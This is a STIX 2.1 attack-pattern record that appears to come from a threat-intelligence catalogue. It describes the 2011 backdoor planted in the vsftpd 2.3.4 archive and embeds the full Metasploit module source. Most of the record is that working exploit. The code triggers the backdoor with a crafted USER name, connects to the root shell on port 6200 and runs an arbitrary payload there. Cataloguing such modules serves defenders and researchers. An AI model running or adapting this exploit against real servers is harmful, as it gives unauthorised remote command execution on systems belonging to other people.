{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f96c4e11-52eb-4ce0-85fd-513c9d6853c9",
    "created": "2024-08-14T17:14:32.632551Z",
    "modified": "2024-08-14T17:14:32.632555Z",
    "name": "VSFTPD v2.3.4 Backdoor Command Execution",
    "description": " This module exploits a malicious backdoor that was added to the\tVSFTPD download archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 according to the most recent information available. This backdoor was removed on July 3rd 2011. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/ftp/vsftpd_234_backdoor.rb",
            "external_id": "vsftpd_234_backdoor.rb"
        },
        {
            "source_name": "reference",
            "url": "http://pastebin.com/AetT9sS5"
        },
        {
            "source_name": "reference",
            "url": "http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'VSFTPD v2.3.4 Backdoor Command Execution',\n      'Description'    => %q{\n          This module exploits a malicious backdoor that was added to the\tVSFTPD download\n          archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between\n          June 30th 2011 and July 1st 2011 according to the most recent information\n          available. This backdoor was removed on July 3rd 2011.\n      },\n      'Author'         => [ 'hdm', 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '73573'],\n          [ 'URL', 'http://pastebin.com/AetT9sS5'],\n          [ 'URL', 'http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html' ],\n        ],\n      'Privileged'     => true,\n      'Platform'       => [ 'unix' ],\n      'Arch'           => ARCH_CMD,\n      'Payload'        =>\n        {\n          'Space'    => 2000,\n          'BadChars' => '',\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType'    => 'cmd_interact',\n              'ConnectionType' => 'find'\n            }\n        },\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n        ],\n      'DisclosureDate' => '2011-07-03',\n      'DefaultTarget' => 0))\n\n    register_options([ Opt::RPORT(21) ])\n  end\n\n  def exploit\n\n    nsock = self.connect(false, {'RPORT' => 6200}) rescue nil\n    if nsock\n      print_status(\"The port used by the backdoor bind listener is already open\")\n      handle_backdoor(nsock)\n      return\n    end\n\n    # Connect to the FTP service port first\n    connect\n\n    banner = sock.get_once(-1, 30).to_s\n    print_status(\"Banner: #{banner.strip}\")\n\n    sock.put(\"USER #{rand_text_alphanumeric(rand(6)+1)}:)\\r\\n\")\n    resp = sock.get_once(-1, 30).to_s\n    print_status(\"USER: #{resp.strip}\")\n\n    if resp =~ /^530 /\n      print_error(\"This server is configured for anonymous only and the backdoor code cannot be reached\")\n      disconnect\n      return\n    end\n\n    if resp !~ /^331 /\n      print_error(\"This server did not respond as expected: #{resp.strip}\")\n      disconnect\n      return\n    end\n\n    sock.put(\"PASS #{rand_text_alphanumeric(rand(6)+1)}\\r\\n\")\n\n    # Do not bother reading the response from password, just try the backdoor\n    nsock = self.connect(false, {'RPORT' => 6200}) rescue nil\n    if nsock\n      print_good(\"Backdoor service has been spawned, handling...\")\n      handle_backdoor(nsock)\n      return\n    end\n\n    disconnect\n\n  end\n\n  def handle_backdoor(s)\n\n    s.put(\"id\\n\")\n\n    r = s.get_once(-1, 5).to_s\n    if r !~ /uid=/\n      print_error(\"The service on port 6200 does not appear to be a shell\")\n      disconnect(s)\n      return\n    end\n\n    print_good(\"UID: #{r.strip}\")\n\n    s.put(\"nohup \" + payload.encoded + \" >/dev/null 2>&1\")\n    handler(s)\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-07-03",
    "x_mitre_platforms": [
        "[ 'unix' ]"
    ]
}